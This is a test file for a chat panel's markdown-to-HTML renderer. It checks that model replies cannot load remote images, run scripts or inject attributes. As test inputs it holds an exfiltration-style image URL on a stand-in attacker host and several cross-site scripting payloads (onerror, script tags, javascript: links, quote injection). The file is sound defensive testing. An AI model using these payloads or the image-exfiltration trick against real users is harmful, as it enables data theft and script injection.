// Tests for media/markdown.js, the chat panel's reply renderer. Run with `npm test`.
const test = require('node:test');
const assert = require('node:assert/strict');
const { esc, mdToHtml, markPaths } = require('../media/markdown.js');

test('a remote image becomes a link and is never loaded', () => {
  const html = mdToHtml('Look: ![chart](https://attacker.example/x.png?d=secret)');
  assert.doesNotMatch(html, /<img/);
  assert.match(html, /<a class="md-image" href="https:\/\/attacker\.example\/x\.png\?d=secret"[^>]*>Image: chart<\/a>/);
});

test('an image with no alt text names its URL', () => {
  assert.match(mdToHtml('![](https://example.com/a.png)'), />Image: https:\/\/example\.com\/a\.png<\/a>/);
});

test('raw HTML in a reply is shown as text', () => {
  const html = mdToHtml('<img src=x onerror="alert(1)"> and <script>alert(2)</script>');
  assert.doesNotMatch(html, /<img|<script/);
  assert.match(html, /&lt;img src=x onerror=&quot;alert\(1\)&quot;&gt;/);
});

test('only http, https, and mailto become links', () => {
  assert.doesNotMatch(mdToHtml('[click](javascript:alert(1))'), /<a /);
  assert.doesNotMatch(mdToHtml('[click](data:text/html,hi)'), /<a /);
  assert.match(mdToHtml('[docs](https://example.com/docs)'), /<a href="https:\/\/example\.com\/docs"/);
  assert.match(mdToHtml('[mail](mailto:a@example.com)'), /<a href="mailto:a@example\.com"/);
});

test('a quote in a link URL cannot add attributes', () => {
  const html = mdToHtml('[x](https://example.com/"onmouseover="alert(1))');
  assert.doesNotMatch(html, /" ?onmouseover=/);
});

test('code blocks are escaped and keep their language', () => {
  const html = mdToHtml('```html\n<b>hi</b>\n```');
  assert.match(html, /<pre data-lang="html">/);
  assert.match(html, /<code>&lt;b&gt;hi&lt;\/b&gt;<\/code>/);
});

test('file paths are marked, but not inside links or code blocks', () => {
  assert.match(markPaths('<p>See src/foo.ts:12</p>'), /<span class="path-ref" data-path="src\/foo.ts" data-line="12">src\/foo.ts:12<\/span>/);
  assert.doesNotMatch(mdToHtml('[src/foo.ts](https://example.com)'), /path-ref/);
  assert.doesNotMatch(mdToHtml('```\nsrc/foo.ts\n```'), /path-ref/);
});

test('esc escapes the characters that matter in HTML and attributes', () => {
  assert.equal(esc('<a href="x">&</a>'), '&lt;a href=&quot;x&quot;&gt;&amp;&lt;/a&gt;');
});
